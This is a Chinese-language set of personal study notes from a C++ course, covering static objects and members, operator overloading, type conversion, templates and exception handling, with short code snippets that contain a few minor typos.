<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220824021345312.png" alt="image-20220824021345312"></p>
<p>编译器自动检查 Person ( who ) 不需要构造;</p>
<h2 id="Constructor-vs-assignment-赋值"><a href="#Constructor-vs-assignment-赋值" class="headerlink" title="Constructor vs. assignment(赋值)."></a>Constructor vs. assignment(赋值).</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220824021615402.png" alt="image-20220824021615402"></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220824021746652.png" alt="image-20220824021746652"></p>
<h2 id="拷贝构造指示"><a href="#拷贝构造指示" class="headerlink" title="拷贝构造指示"></a>拷贝构造指示</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220824022019565.png" alt="image-20220824022019565"></p>
<blockquote>
<p> 写一个类</p>
<ol>
<li>构造函数 (constructor)</li>
<li>virtual constructor (虚构函数)</li>
<li>拷贝构造函数  (copy constructor)</li>
<li>不要依赖于编译器给你的那个默认构造</li>
</ol>
</blockquote>
<h1 id="第二十三章-静态对象"><a href="#第二十三章-静态对象" class="headerlink" title="第二十三章 静态对象"></a>第二十三章 静态对象</h1><h2 id="Static-in-C"><a href="#Static-in-C" class="headerlink" title="Static in C++"></a>Static in C++</h2><ul>
<li>Static storage<ul>
<li>allocated once at a fixed address</li>
</ul>
</li>
<li>Visibility of a name <ul>
<li>internal linkage</li>
</ul>
</li>
<li>Don’t use static except inside functions and classes.</li>
</ul>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220825140658443.png" alt="image-20220825140658443"></p>
<h3 id="静态对象保证"><a href="#静态对象保证" class="headerlink" title="静态对象保证"></a>静态对象保证</h3><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220825141531142.png" alt="image-20220825141531142"></p>
<ol>
<li>只初始化一次(构造只执行一次)</li>
<li>析构在退出程序之前执行</li>
</ol>
<h2 id="条件构造"><a href="#条件构造" class="headerlink" title="条件构造"></a>条件构造</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220825141753759.png" alt="image-20220825141753759"></p>
<blockquote>
<p>my_x  1.只析构一次, 当分 x &gt; 10时, f()被调用 2. 第二次进入函数仍然保持它的值. 3. 只有构造过才会析构</p>
</blockquote>
<h2 id="全局变量-对象"><a href="#全局变量-对象" class="headerlink" title="全局变量(对象)"></a>全局变量(对象)</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220825142100345.png" alt="image-20220825142100345"></p>
<p> main()不再是进入函数后执行的第一条函数</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220825142454203.png" alt="image-20220825142454203"></p>
<p>跨文件的全局变量初始化的顺序没有人规定</p>
<h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><p>但某个变量的值需要另一个变量初始化过, 因为 跨文件的全局变量初始化顺序是随机的, 所以容易出错.</p>
<p>解决办法:</p>
<ol>
<li>全局变量声明在同一个文件中(有依赖的全局变量);</li>
<li>不使用全局变量</li>
</ol>
<blockquote>
<p><code>static修饰全局变量，使得全局变量作用域只限于当前文件，不可被跨文件使用。</code></p>
</blockquote>
<h1 id="第二十四章-静态成员"><a href="#第二十四章-静态成员" class="headerlink" title="第二十四章 静态成员"></a>第二十四章 静态成员</h1><h2 id="我们怎么分配静态内存空间"><a href="#我们怎么分配静态内存空间" class="headerlink" title="我们怎么分配静态内存空间?"></a>我们怎么分配静态内存空间?</h2><ul>
<li><p>Static means</p>
<ul>
<li>Hidden</li>
<li>Persistent</li>
</ul>
</li>
<li><p>Hidden: A static member is a member</p>
<ul>
<li>Obeys usual access rules</li>
</ul>
</li>
<li>Persistent: Independent of instances</li>
<li>Static members are class-wide<ul>
<li>variables or</li>
<li>functions</li>
</ul>
</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> namespacee std;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    	<span class="built_in">A</span>() &#123; i = <span class="number">0</span>; &#125;</span><br><span class="line">    	<span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123;cout &lt;&lt; i &lt;&lt; endl; &#125;</span><br><span class="line">    	<span class="function"><span class="keyword">void</span> <span class="title">set</span><span class="params">(<span class="keyword">int</span> ii)</span> </span>&#123; i=ii; &#125;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    	<span class="keyword">static</span> <span class="keyword">int</span> i;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> A::i; <span class="comment">// 静态的成员变量实际上是全局变量,类的静态成员变量需要声明.</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span>&#123;</span><br><span class="line">    A a,b;</span><br><span class="line">    a.<span class="built_in">set</span>(<span class="number">10</span>);</span><br><span class="line">    b.<span class="built_in">print</span>();</span><br><span class="line">    cout &lt;&lt;a.i &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; A::i &lt;&lt; endl;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="静态的成员变量实际是全局变量"><a href="#静态的成员变量实际是全局变量" class="headerlink" title="静态的成员变量实际是全局变量"></a>静态的成员变量实际是全局变量</h2><blockquote>
<p>初始化列表是会对非静态成员做初始化 对静态成员变量不做初始化.</p>
</blockquote>
<h2 id="静态的成员函数"><a href="#静态的成员函数" class="headerlink" title="静态的成员函数"></a>静态的成员函数</h2><p>在静态函数/成员变量调用之前依然能够访问这个函数/变量</p>
<p>但静态的函数只能调用静态的成员变量    </p>
<p><code>A::i</code> 类中没有this, 于是不能访问非静态的函数/成员变量    </p>
<h1 id="第二十五章-运算符-基本规则"><a href="#第二十五章-运算符-基本规则" class="headerlink" title="第二十五章 运算符 - 基本规则"></a>第二十五章 运算符 - 基本规则</h1><h2 id="运算符重载"><a href="#运算符重载" class="headerlink" title="运算符重载"></a>运算符重载</h2><blockquote>
<p>写函数改变运算符的行为: 运算符(如下) </p>
</blockquote>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220828065321925.png" alt="image-20220828065321925"></p>
<h2 id="不能重载的运算符"><a href="#不能重载的运算符" class="headerlink" title="不能重载的运算符"></a>不能重载的运算符</h2><blockquote>
<p>. .* :: ?: </p>
<p>sizeof  typeid </p>
<p>static_cast dynamic_cast const_cast</p>
<p>reinterpret_cast</p>
<ol>
<li>只有已经存在使得运算符可以重载 (如: ** 不能重载)</li>
<li>只能在类或者枚举类型定义一个运算符</li>
<li>运算符重载<ul>
<li>不能改变他的优先级</li>
<li>不能改变他的操作对象</li>
</ul>
</li>
</ol>
</blockquote>
<h2 id="运算符左边的对象做-receiver-来决定我们用哪个运算符"><a href="#运算符左边的对象做-receiver-来决定我们用哪个运算符" class="headerlink" title="运算符左边的对象做 receiver 来决定我们用哪个运算符"></a>运算符左边的对象做 receiver 来决定我们用哪个运算符</h2><p>​    如:</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220828072648135.png" alt="image-20220828072648135"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">Inter <span class="title">x</span><span class="params">(<span class="number">1</span>)</span>, <span class="title">y</span><span class="params">(<span class="number">5</span>)</span>, z</span>;</span><br><span class="line">x + y;  ====&gt;x.<span class="keyword">operator</span> + (y);</span><br><span class="line">z = x + y; √ <span class="comment">// x 和 y 的对象相同 可以做运算</span></span><br><span class="line">z = x + <span class="number">3</span>; √  <span class="comment">//默认Inter的 &#x27;+&#x27;</span></span><br><span class="line">z = <span class="number">3</span> + y; × <span class="comment">//默认整数的 &#x27;+&#x27; , 需要 y 类型转换成 整数</span></span><br><span class="line">z = x + <span class="number">3.5</span> × <span class="comment">//3.5是double</span></span><br></pre></td></tr></table></figure>
<h2 id="一元的运算符可以不调用参数"><a href="#一元的运算符可以不调用参数" class="headerlink" title="一元的运算符可以不调用参数."></a>一元的运算符可以不调用参数.</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220828072539476.png" alt="image-20220828072539476"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">z= -x;</span><br><span class="line">z.opertator = (x.opertator- ()));</span><br></pre></td></tr></table></figure>
<h2 id="如果运算符重载不作为成员函数-作为全局函数的时候"><a href="#如果运算符重载不作为成员函数-作为全局函数的时候" class="headerlink" title="如果运算符重载不作为成员函数, 作为全局函数的时候"></a>如果运算符重载不作为成员函数, 作为全局函数的时候</h2><p>作为全局函数的时候</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220828073546019.png" alt="image-20220828073546019"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">z = x + y;</span><br><span class="line">z = x + <span class="number">3</span>;</span><br><span class="line">z = <span class="number">3</span> + y;</span><br><span class="line">z = <span class="number">3</span> + <span class="number">7</span>;</span><br><span class="line"><span class="comment">//以上都可以被Integer类</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220828073633061.png" alt="image-20220828073633061"></p>
<ul>
<li><p>单目运算符应该是成员函数</p>
</li>
<li><p>= () [] -&gt; -&gt;* 必须是成员函数</p>
</li>
<li><p>赋值运算符应该是成员函数</p>
</li>
<li><p>所有其他的双目运算符可以做非成员函数</p>
</li>
</ul>
<blockquote>
<p>单目: 如 ~ ! ++ —等 (只对自己运算)</p>
<p>双目: + - * / == 等 (对两个数运算)</p>
<p>三目: (条件)?(行为):(行为)</p>
</blockquote>
<h1 id="第二十六章-运算符重载-原型"><a href="#第二十六章-运算符重载-原型" class="headerlink" title="第二十六章 运算符重载 - 原型"></a>第二十六章 运算符重载 - 原型</h1><h2 id="Argument-Passing-参数传递"><a href="#Argument-Passing-参数传递" class="headerlink" title="Argument Passing (参数传递)"></a>Argument Passing (参数传递)</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220828210946892.png" alt="image-20220828210946892"></p>
<h2 id="Return-Values"><a href="#Return-Values" class="headerlink" title="Return Values"></a>Return Values</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220828211649931.png" alt="image-20220828211649931"></p>
<p>赋值做左值 -&gt; 应该返回 reference </p>
<p>加减乘除不修改本身的值</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220829235220107.png" alt="image-20220829235220107"></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220828211941493.png" alt=" "></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">prefix++  <span class="comment">// ++a</span></span><br><span class="line">postfix++ <span class="comment">// --a</span></span><br></pre></td></tr></table></figure>
<h2 id="Relatonal-operators"><a href="#Relatonal-operators" class="headerlink" title="Relatonal operators"></a>Relatonal operators</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220829235704816.png" alt="image-20220829235704816"></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220829235714730.png" alt="image-20220829235714730"></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220830000239109.png" alt="image-20220830000239109"></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220830000249062.png" alt="image-20220830000249062"></p>
<h2 id="Operator"><a href="#Operator" class="headerlink" title="Operator []"></a>Operator []</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220830000021453.png" alt="image-20220830000021453"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> &amp; <span class="keyword">operator</span>[](<span class="keyword">int</span> index) &#123; <span class="keyword">return</span> m_array[index]; &#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220830000113220.png" alt="image-20220830000113220"></p>
<h1 id="第二十七章-运算符重载-赋值"><a href="#第二十七章-运算符重载-赋值" class="headerlink" title="第二十七章 运算符重载-赋值"></a>第二十七章 运算符重载-赋值</h1><h2 id="赋值原型"><a href="#赋值原型" class="headerlink" title="赋值原型"></a>赋值原型<img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220830000840248.png" alt="image-20220830000840248"></h2><h1 id="第二十八章-运算符重载-类型转换"><a href="#第二十八章-运算符重载-类型转换" class="headerlink" title="第二十八章 运算符重载 - 类型转换"></a>第二十八章 运算符重载 - 类型转换</h1><h2 id="Value-classes"><a href="#Value-classes" class="headerlink" title="Value classes"></a>Value classes</h2><p> <img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220901101528615.png" alt="image-20220901101528615"></p>
<p>C++ 所有的类都是小写开头</p>
<h2 id="Type-conversions"><a href="#Type-conversions" class="headerlink" title="Type conversions"></a>Type conversions</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220901101648901.png" alt="image-20220901101648901"></p>
<h2 id="Wants-a-Two-has-a-One"><a href="#Wants-a-Two-has-a-One" class="headerlink" title="Wants a Two, has a One;"></a>Wants a Two, has a One;</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220901103316546.png" alt="image-20220901103316546"></p>
<p>搞清楚 Two 和 one 变量到底指什么</p>
<h2 id="explicit-显示的"><a href="#explicit-显示的" class="headerlink" title="explicit (显示的)"></a>explicit (显示的)</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220901103546207.png" alt="image-20220901103546207"></p>
<p>传one参数进去不太会做自动类型转换</p>
<h2 id="类型转换语句"><a href="#类型转换语句" class="headerlink" title="类型转换语句"></a>类型转换语句</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">X::<span class="keyword">operator</span> T&#123;</span><br><span class="line">    <span class="comment">// 实现转换的语句</span></span><br><span class="line">&#125; <span class="comment">//无返回值类型，无参数，返回目标类型的对象</span></span><br><span class="line"><span class="comment">//比如:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Complex</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">   <span class="built_in">Complex</span>( ):<span class="built_in">real</span>(<span class="number">0</span>),<span class="built_in">imag</span>(<span class="number">0</span>) &#123;&#125;</span><br><span class="line">   <span class="built_in">Complex</span>(<span class="keyword">double</span> r,<span class="keyword">double</span> i):<span class="built_in">real</span>(r),<span class="built_in">imag</span>(i)&#123;&#125;</span><br><span class="line">   <span class="function"><span class="keyword">operator</span> <span class="keyword">double</span> <span class="title">const</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span>  real; <span class="comment">//类型转换语句</span></span><br><span class="line">   &#125; <span class="comment">//类型转换函数     </span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">   <span class="keyword">double</span> real;</span><br><span class="line">   <span class="keyword">double</span> imag;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="function">Complex <span class="title">c1</span><span class="params">(<span class="number">3</span>,<span class="number">4</span>)</span>,<span class="title">c2</span><span class="params">(<span class="number">5</span>,<span class="number">-10</span>)</span>,c3</span>;</span><br><span class="line">   <span class="keyword">double</span> d;</span><br><span class="line">   d=<span class="number">2.5</span>+c1;<span class="comment">//要求将一个double数据与Complex类数据相加</span></span><br><span class="line">   cout&lt;&lt;d&lt;&lt;endl;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Inputs: 5.5</span></span><br></pre></td></tr></table></figure>
<ul>
<li>Operator name is any tpye descripritor</li>
<li>No explicit arguments</li>
<li>No return type</li>
<li>Compiler will use it as a type conversion from X —&gt; T  (吧X 类对象转化为T 类对象)</li>
</ul>
<h2 id="从窄的变成宽的会自动类型转换"><a href="#从窄的变成宽的会自动类型转换" class="headerlink" title="从窄的变成宽的会自动类型转换"></a>从窄的变成宽的会自动类型转换</h2><p>​    <img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220901104553743.png" alt="image-20220901104553743"></p>
<blockquote>
<p>T -&gt; T&amp; (初始化或者赋值)</p>
<p>T&amp; -&gt; T (把T&amp;中的值交给T)</p>
</blockquote>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220901105850764.png" alt="image-20220901105850764"></p>
<p>加一个禁止类型转换关键字 <code>explicit</code></p>
<p>最好写功能函数 实现类型转换</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220901110027289.png" alt="image-20220901110027289"></p>
<h1 id="第二十九章-模板I"><a href="#第二十九章-模板I" class="headerlink" title="第二十九章 模板I"></a>第二十九章 模板I</h1><h2 id="Why-templates"><a href="#Why-templates" class="headerlink" title="Why templates?"></a>Why templates?</h2><p>类型参数</p>
<p>函数模板</p>
<p>类模板</p>
<p>Template functions</p>
<p>Template classes</p>
<h2 id="函数模板使用"><a href="#函数模板使用" class="headerlink" title="函数模板使用"></a>函数模板使用</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap_1</span><span class="params">(<span class="keyword">int</span> &amp;x, <span class="keyword">int</span> &amp; y)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> temp = x;</span><br><span class="line">	x = y;</span><br><span class="line">	y = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt; <span class="class"><span class="keyword">class</span> <span class="title">T</span> &gt;</span> 	 <span class="comment">// template &lt; typename T &gt;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap_1</span> <span class="params">( T&amp;x, T&amp; y)</span> </span>&#123;</span><br><span class="line">	T temp = x;</span><br><span class="line">    x = y;</span><br><span class="line">    y = temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//函数模板</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220901115032424.png" alt="image-20220901115032424"></p>
<h2 id="如果要做模板-不会进行类型转换"><a href="#如果要做模板-不会进行类型转换" class="headerlink" title="如果要做模板, 不会进行类型转换"></a>如果要做模板, 不会进行类型转换</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220901115416190.png" alt="image-20220901115416190"></p>
<h2 id="类模板的使用方法"><a href="#类模板的使用方法" class="headerlink" title="类模板的使用方法"></a>类模板的使用方法</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220901120014134.png" alt="image-20220901120014134"></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220901120233477.png" alt="image-20220901120233477"></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220901115943105.png" alt="image-20220901115943105"></p>
<h1 id="第三十章-模板II"><a href="#第三十章-模板II" class="headerlink" title="第三十章 模板II"></a>第三十章 模板II</h1><h2 id="函数模板类"><a href="#函数模板类" class="headerlink" title="函数模板类"></a>函数模板类</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220906235854432.png" alt="image-20220906235854432"></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220906234217080.png" alt="image-20220906234217080"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">vector&lt; vector&lt; <span class="keyword">double</span> * &gt; &gt; <span class="comment">// note spcae &gt; &gt;</span></span><br><span class="line">vector&lt; <span class="keyword">int</span> (*) (vector &lt;<span class="keyword">double</span>&gt;&amp;,<span class="keyword">int</span>)&gt;</span><br></pre></td></tr></table></figure>
<h1 id="第三十一章-异常基本概念"><a href="#第三十一章-异常基本概念" class="headerlink" title="第三十一章 异常基本概念"></a>第三十一章 异常基本概念</h1><h2 id="Exceptions-（异常）"><a href="#Exceptions-（异常）" class="headerlink" title="Exceptions （异常）"></a>Exceptions （异常）</h2><blockquote>
<p>c++ 你写的不好的代码不应该被运行</p>
</blockquote>
<p>c++ 比 c 语言更多检查</p>
<h2 id="EX-read-a-file"><a href="#EX-read-a-file" class="headerlink" title="EX. read a file"></a>EX. read a file</h2><p>open the file；1、文件不存在。 2、文件存在，但不可读取。 ……</p>
<p>determine its size；</p>
<p>allocate that much memory； 1、介质可能会坏掉</p>
<p>read the file into memory；</p>
<p>close the file；</p>
<p>以上每一句话可能都有问题</p>
<p>C 中每个操作都有对应的返回值告诉你操作是否成功。</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220913184633624.png" alt="image-20220913184633624"></p>
<h2 id="Working-w-exception"><a href="#Working-w-exception" class="headerlink" title="Working /w exception"></a>Working /w exception</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">try&#123;</span><br><span class="line">	open the file;</span><br><span class="line">	determine the file;</span><br><span class="line">	alloocate that much memory;</span><br><span class="line">	read the file into memory;</span><br><span class="line">&#125; catch (fileOpenFailed)&#123;</span><br><span class="line">	doSomething;</span><br><span class="line">&#125; catch (sizeDetermination)&#123;</span><br><span class="line">	doSomething;</span><br><span class="line">&#125; catch (memoryAllocation)&#123;</span><br><span class="line">	doSomething;</span><br><span class="line">&#125; catch(readFailed)&#123;</span><br><span class="line">	doSomething;</span><br><span class="line">&#125; catchZ(fileCloseFailed)&#123;</span><br><span class="line">	doSomething;</span><br><span class="line">&#125;</span><br><span class="line">异常处理的方式</span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220913185322857.png" alt="image-20220913185322857"></p>
<ul>
<li>I take exception to that</li>
<li>At the point where the problem occurs, you might not what to do with it, but you do know that you can’t just continue on merrily; you must stop, and somebody, somewhere must figure out what to do.</li>
</ul>
<h2 id="Why-exception"><a href="#Why-exception" class="headerlink" title="Why exception?"></a>Why exception?</h2><p>exception把 业务逻辑和错误处理分开的很清楚。</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220913185634255.png" alt="image-20220913185634255"></p>
<ul>
<li>异常处理最大的好处就是， 他们能够清理和处理错误代码</li>
<li>分开了描述你想要做的代码和你需要执行的代码</li>
</ul>
<h1 id="第三十二章-异常抛出和捕获"><a href="#第三十二章-异常抛出和捕获" class="headerlink" title="第三十二章 异常抛出和捕获"></a>第三十二章 异常抛出和捕获</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">try&#123; </span><br><span class="line"> // 可能会导致错误的代码</span><br><span class="line">&#125; catch(error)&#123; </span><br><span class="line"> // 在错误发生时怎么处理</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<h2 id="看一个例子"><a href="#看一个例子" class="headerlink" title="看一个例子"></a>看一个例子</h2><p>如果 operatior[] （index） 越界了怎么办？</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220913190459719.png" alt="image-20220913190459719"></p>
<ol>
<li>什么返回值都不做</li>
</ol>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220913190345021.png" alt="image-20220913190345021"></p>
<ol>
<li>返回错误的值 但是依然可以做成加减法，不合理.</li>
</ol>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220913190352338.png" alt="image-20220913190352338"></p>
<ol>
<li><p>Just die！</p>
<p> <img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220913190652289.png" alt="image-20220913190652289"></p>
</li>
<li><p>Die gracefully （with autoplay!） ASSERT…</p>
</li>
</ol>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220913190658272.png" alt="image-20220913190658272"></p>
<h2 id="When-to-use-exception"><a href="#When-to-use-exception" class="headerlink" title="When to use exception"></a>When to use exception</h2><h2 id="How-to-raise-an-Exception"><a href="#How-to-raise-an-Exception" class="headerlink" title="How  to raise an Exception"></a>How  to raise an Exception</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220913190903938.png" alt="image-20220913190903938"></p>
<p><code>throw &lt;&lt; something &gt;&gt;</code></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220913192837860.png" alt="image-20220913192837860"></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220913193758031.png" alt="image-20220913193758031"></p>
<p>….(详见视频 看不懂)</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220913194448781.png" alt="image-20220913194448781"></p>
<p>异常处理1. 处理完之后回去继续执行下一条语句， 2. 处理完之后重新处理</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220913194801717.png" alt="image-20220913194801717"></p>
<p>catch (…) 所有的异常类型。。。</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220913194859031.png" alt="image-20220913194859031"></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220913195526829.png" alt="image-20220913195526829"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">throw expression;</span><br><span class="line">- throws value for matching 抛出一串表达式</span><br><span class="line">throw; </span><br><span class="line">- 接受刚刚真正处理的表达式</span><br><span class="line">- 只能在这个catch 里面使用</span><br></pre></td></tr></table></figure>
<h1 id="第三十三章-异常语句"><a href="#第三十三章-异常语句" class="headerlink" title="第三十三章 异常语句"></a>第三十三章 异常语句</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">.... <span class="comment">// maybe Error</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in"><span class="keyword">catch</span></span> (SomeType v) &#123;</span><br><span class="line">...<span class="comment">// handler code</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in"><span class="keyword">catch</span></span> (SomeType v) &#123;</span><br><span class="line">...<span class="comment">// handler code</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
